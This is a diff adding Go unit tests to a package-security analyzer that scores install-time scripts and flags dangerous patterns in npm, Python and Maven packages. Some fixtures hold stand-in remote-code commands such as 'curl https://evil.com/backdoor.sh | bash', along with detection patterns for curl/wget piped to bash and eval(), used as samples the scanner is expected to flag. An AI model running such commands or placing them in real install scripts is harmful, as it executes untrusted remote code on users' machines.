@@ -214,7 +214,7 @@ func TestDetectCommitFrequencyAnomaly(t *testing.T) {
 			recentCommits: makeCommits(10, time.Now().AddDate(0, -3, 0)),
 			olderCommits:  makeCommits(0, time.Now().AddDate(-1, 0, 0)),
 			repoAge:       time.Now().AddDate(-1, 0, 0), // Only 1 year old
-			expectedRisk:  nil, // Too young for this check
+			expectedRisk:  nil,                           // Too young for this check
 		},
 	}
 
@@ -256,4 +256,281 @@ func makeCommits(count int, startDate time.Time) []fetcher.GitHubCommit {
 		}
 	}
 	return commits
+}
+
+func TestScoreInstallExecution_NoScripts(t *testing.T) {
+	analyzer := NewAnalyzer()
+	result := &models.AnalysisResult{
+		Metadata: models.PackageMetadata{
+			HasInstallScripts: false,
+			InstallScripts:    map[string]string{},
+		},
+	}
+
+	score := analyzer.scoreInstallExecution(result)
+
+	if score.RiskPoints != 0 {
+		t.Errorf("Expected 0 risk points for no scripts, got %d", score.RiskPoints)
+	}
+	if score.Score != 2 {
+		t.Errorf("Expected score of 2, got %d", score.Score)
+	}
+	if !score.Verified {
+		t.Error("Expected score to be verified")
+	}
+}
+
+func TestScoreInstallExecution_SingleBenignScript(t *testing.T) {
+	analyzer := NewAnalyzer()
+	result := &models.AnalysisResult{
+		Metadata: models.PackageMetadata{
+			HasInstallScripts: true,
+			InstallScripts: map[string]string{
+				"postinstall": "echo 'Installation complete'",
+			},
+			InstallScriptAnalysis: &models.InstallScriptAnalysis{
+				HasDangerousPatterns: false,
+				RiskLevel:            "LOW",
+				ScriptCount:          0,
+			},
+		},
+	}
+
+	score := analyzer.scoreInstallExecution(result)
+
+	if score.RiskPoints != 1 {
+		t.Errorf("Expected 1 risk point for single benign script, got %d", score.RiskPoints)
+	}
+	if score.Score != 0 {
+		t.Errorf("Expected score of 0, got %d", score.Score)
+	}
+}
+
+func TestScoreInstallExecution_MultipleBenignScripts(t *testing.T) {
+	analyzer := NewAnalyzer()
+	result := &models.AnalysisResult{
+		Metadata: models.PackageMetadata{
+			HasInstallScripts: true,
+			InstallScripts: map[string]string{
+				"preinstall":  "echo 'Pre-install'",
+				"postinstall": "echo 'Post-install'",
+			},
+			InstallScriptAnalysis: &models.InstallScriptAnalysis{
+				HasDangerousPatterns: false,
+				RiskLevel:            "LOW",
+				ScriptCount:          0,
+			},
+		},
+	}
+
+	score := analyzer.scoreInstallExecution(result)
+
+	if score.RiskPoints != 2 {
+		t.Errorf("Expected 2 risk points for multiple scripts, got %d", score.RiskPoints)
+	}
+	if score.Score != 0 {
+		t.Errorf("Expected score of 0, got %d", score.Score)
+	}
+}
+
+func TestScoreInstallExecution_DangerousScript(t *testing.T) {
+	analyzer := NewAnalyzer()
+	result := &models.AnalysisResult{
+		Metadata: models.PackageMetadata{
+			HasInstallScripts: true,
+			InstallScripts: map[string]string{
+				"postinstall": "curl https://evil.com/backdoor.sh | bash",
+			},
+			InstallScriptAnalysis: &models.InstallScriptAnalysis{
+				HasDangerousPatterns: true,
+				RiskLevel:            "HIGH",
+				ScriptCount:          1,
+				DangerousPatterns: []models.DangerousPattern{
+					{
+						Pattern:     "curl/wget | bash",
+						Description: "Downloads and executes remote script without verification",
+						Severity:    "HIGH",
+					},
+				},
+			},
+		},
+	}
+
+	score := analyzer.scoreInstallExecution(result)
+
+	if score.RiskPoints != 2 {
+		t.Errorf("Expected 2 risk points for dangerous script, got %d", score.RiskPoints)
+	}
+	if score.Score != 0 {
+		t.Errorf("Expected score of 0, got %d", score.Score)
+	}
+	if score.Description != "Dangerous install-time operations detected" {
+		t.Errorf("Unexpected description: %s", score.Description)
+	}
+}
+
+func TestScoreInstallExecution_PythonSetupWithCmdClass(t *testing.T) {
+	analyzer := NewAnalyzer()
+	result := &models.AnalysisResult{
+		Metadata: models.PackageMetadata{
+			HasInstallScripts: true,
+			InstallScripts: map[string]string{
+				"setup.py": "cmdclass={'install': CustomInstall}",
+			},
+			InstallScriptAnalysis: &models.InstallScriptAnalysis{
+				HasDangerousPatterns: true,
+				RiskLevel:            "MEDIUM",
+				ScriptCount:          1,
+				DangerousPatterns: []models.DangerousPattern{
+					{
+						Pattern:     "cmdclass override",
+						Description: "Overrides setup.py command classes",
+						Severity:    "MEDIUM",
+					},
+				},
+			},
+		},
+	}
+
+	score := analyzer.scoreInstallExecution(result)
+
+	if score.RiskPoints != 2 {
+		t.Errorf("Expected 2 risk points for dangerous Python setup, got %d", score.RiskPoints)
+	}
+}
+
+func TestScoreInstallExecution_JavaWithMavenExecPlugin(t *testing.T) {
+	analyzer := NewAnalyzer()
+	result := &models.AnalysisResult{
+		Metadata: models.PackageMetadata{
+			HasInstallScripts: true,
+			InstallScripts: map[string]string{
+				"pom.xml": "<plugin>maven-exec-plugin</plugin>",
+			},
+			InstallScriptAnalysis: &models.InstallScriptAnalysis{
+				HasDangerousPatterns: true,
+				RiskLevel:            "HIGH",
+				ScriptCount:          1,
+				DangerousPatterns: []models.DangerousPattern{
+					{
+						Pattern:     "maven-exec-plugin",
+						Description: "Executes arbitrary commands during build",
+						Severity:    "HIGH",
+					},
+				},
+			},
+		},
+	}
+
+	score := analyzer.scoreInstallExecution(result)
+
+	if score.RiskPoints != 2 {
+		t.Errorf("Expected 2 risk points for dangerous Maven plugin, got %d", score.RiskPoints)
+	}
+}
+
+func TestHasInstallTimeScripts_NPM(t *testing.T) {
+	tests := []struct {
+		name     string
+		scripts  map[string]string
+		expected bool
+	}{
+		{
+			name: "has postinstall",
+			scripts: map[string]string{
+				"postinstall": "echo 'done'",
+				"test":        "jest",
+			},
+			expected: true,
+		},
+		{
+			name: "has preinstall",
+			scripts: map[string]string{
+				"preinstall": "echo 'preparing'",
+				"build":      "webpack",
+			},
+			expected: true,
+		},
+		{
+			name: "has install",
+			scripts: map[string]string{
+				"install": "node-gyp rebuild",
+			},
+			expected: true,
+		},
+		{
+			name: "no install scripts",
+			scripts: map[string]string{
+				"test":  "jest",
+				"build": "webpack",
+				"start": "node index.js",
+			},
+			expected: false,
+		},
+		{
+			name: "empty install script",
+			scripts: map[string]string{
+				"postinstall": "",
+				"test":        "jest",
+			},
+			expected: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := hasInstallTimeScripts(tt.scripts)
+			if result != tt.expected {
+				t.Errorf("Expected %v, got %v for scripts: %v", tt.expected, result, tt.scripts)
+			}
+		})
+	}
+}
+
+func TestConvertToModelAnalysis(t *testing.T) {
+	scriptAnalysis := ScriptAnalysis{
+		HasDangerousPatterns: true,
+		RiskLevel:            "HIGH",
+		DangerousPatterns: []DangerousPattern{
+			{
+				Pattern:     "curl/wget | bash",
+				Description: "Downloads and executes remote script",
+				Severity:    "HIGH",
+				Match:       "curl https://evil.com | bash",
+			},
+			{
+				Pattern:     "eval()",
+				Description: "Uses eval()",
+				Severity:    "HIGH",
+				Match:       "eval(code)",
+			},
+		},
+	}
+
+	modelAnalysis := convertToModelAnalysis(scriptAnalysis)
+
+	if modelAnalysis.HasDangerousPatterns != scriptAnalysis.HasDangerousPatterns {
+		t.Error("HasDangerousPatterns not converted correctly")
+	}
+	if modelAnalysis.RiskLevel != scriptAnalysis.RiskLevel {
+		t.Error("RiskLevel not converted correctly")
+	}
+	if len(modelAnalysis.DangerousPatterns) != len(scriptAnalysis.DangerousPatterns) {
+		t.Errorf("Expected %d patterns, got %d", len(scriptAnalysis.DangerousPatterns), len(modelAnalysis.DangerousPatterns))
+	}
+
+	for i, p := range modelAnalysis.DangerousPatterns {
+		if p.Pattern != scriptAnalysis.DangerousPatterns[i].Pattern {
+			t.Errorf("Pattern %d not converted correctly", i)
+		}
+		if p.Description != scriptAnalysis.DangerousPatterns[i].Description {
+			t.Errorf("Description %d not converted correctly", i)
+		}
+		if p.Severity != scriptAnalysis.DangerousPatterns[i].Severity {
+			t.Errorf("Severity %d not converted correctly", i)
+		}
+		if p.Match != scriptAnalysis.DangerousPatterns[i].Match {
+			t.Errorf("Match %d not converted correctly", i)
+		}
+	}
 }
